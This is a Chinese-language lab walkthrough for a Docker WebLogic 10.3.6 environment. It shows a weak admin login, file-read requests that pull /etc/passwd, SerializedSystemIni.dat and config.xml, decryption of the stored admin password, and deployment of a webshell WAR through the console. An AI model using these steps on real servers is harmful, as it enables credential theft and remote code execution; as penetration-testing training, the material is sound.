# Weblogic 常规渗透测试环境

## 测试环境

本环境模拟了一个真实的weblogic环境，其后台存在一个弱口令，并且前台存在任意文件读取漏洞。分别通过这两种漏洞，模拟对weblogic场景的渗透。

Weblogic版本：10.3.6(11g)

Java版本：1.6

启动本环境：

```plain
docker compose up -d
```

## 弱口令

环境启动后，访问http://your-ip:7001/console，即为weblogic后台。

本环境存在弱口令：

lweblogic

lOracle@123

weblogic常用弱口令：[http://cirt.net/passwords?criteria=weblogic](http://cirt.net/passwords?criteria=weblogic#tdsub)

## 任意文件读取漏洞的利用

假设不存在弱口令，如何对weblogic进行渗透？

本环境前台模拟了一个任意文件下载漏洞，访问http://your-ip:7001/hello/file.jsp?path=/etc/passwd可见成功读取passwd文件。那么，该漏洞如何利用？

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780965646978-f1b75db5-2ad5-40f2-9af2-09b93655ec47.png)

### 读取后台用户密文与密钥文件

weblogic密码使用AES（老版本3DES）加密，对称加密可解密，只需要找到用户的密文与加密时的密钥即可。这两个文件均位于base_domain下，名为SerializedSystemIni.dat和config.xml，在本环境中为./security/SerializedSystemIni.dat和./config/config.xml（基于当前目录/root/Oracle/Middleware/user_projects/domains/base_domain）。

SerializedSystemIni.dat是一个二进制文件，所以一定要用burpsuite来读取，用浏览器直接下载可能引入一些干扰字符。在burp里选中读取到的那一串乱码，右键copy to file就可以保存成一个文件：

```plain
GET /hello/file.jsp?path=security/SerializedSystemIni.dat HTTP/1.1
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780965646925-365a9825-385e-48f3-960a-4cccfaa0cf05.png)

config.xml是base_domain的全局配置文件，所以乱七八糟的内容比较多，找到其中的<node-manager-password-encrypted>的值，即为加密后的管理员密码，不要找错了：

```plain
GET /hello/file.jsp?path=./config/config.xml HTTP/1.1
<node-manager-password-encrypted>{AES}yvGnizbUS0lga6iPA5LkrQdImFiS/DJ8Lw/yeE7Dt0k=</node-manager-password-encrypted>
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780965647047-e6972bd1-7f33-461f-abd4-6ff5aae001d0.png)

解密密文

然后使用本环境的decrypt目录下的weblogic_decrypt.jar，解密密文（或者参考这篇文章：[http://cb.drops.wiki/drops/tips-349.html](http://cb.drops.wiki/drops/tips-349.html#tdsub)，自己编译一个解密的工具）：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780965647012-58f560a0-c969-4b7b-b905-5c00dd1d8d77.png)![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780965646920-77502f64-f1d7-404b-9c15-03ff73bd94ff.png)

可见，解密后和预设的密码一致，说明成功。

## 后台上传webshell

获取到管理员密码后，登录后台。点击左侧的部署，可见一个应用列表：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780965648003-6a53570d-9fe9-47a5-9a6e-8755865a003e.png)

点击安装，选择“上载文件”：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780965648219-c862fcda-a651-42c7-a669-4e6c48f04879.png)

Welogic 的应用目录在 war 包中WEB-INF/weblogic.xml 里指定（若/hello已经被使用，要在当前环境下部署 shell，需要修改这个目录，比如修改成`/test）：

```plain
<?xml version="1.0" encoding="UTF-8"?>
<weblogic-web-app xmlns="http://www.bea.com/ns/weblogic/weblogic-web-app" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.bea.com/ns/weblogic/weblogic-web-app http://www.bea.com/ns/weblogic/weblogic-web-app/1.0/weblogic-web-app.xsd">
<context-root>/test</context-root>
</weblogic-web-app>
```

我们还是以/hello为例，制作 war 包，将以下文件打包为hello.zip，再重命名为hello.war。

war 包结构如下：

```plain
D:.
│   file.jsp
│   index.jsp
│   ueditor.jsp //your webshell
│
├───META-INF
│       MANIFEST.MF
│
└───WEB-INF
    │   web.xml
    │   weblogic.xml
    │
    └───classes
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780965648213-00fc82f6-e131-43a5-8efb-8ca181a48962.png)![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780965648451-66a521c1-fefb-4a5b-adec-18d7e54248cb.png)![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780965648579-d96d24c3-e217-40ed-bf88-6c774dacb128.png)

上传war包，成功后点下一步，填写应用名称：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780965649198-de46115d-e532-4aa1-9cb1-6209e103072a.png)

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780965649424-594e0cff-13d5-46fd-ac15-a458da11a518.png)

成功获取webshell：![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780965649551-634d8341-fc3a-4a8f-9b0b-9801fc928ad3.png)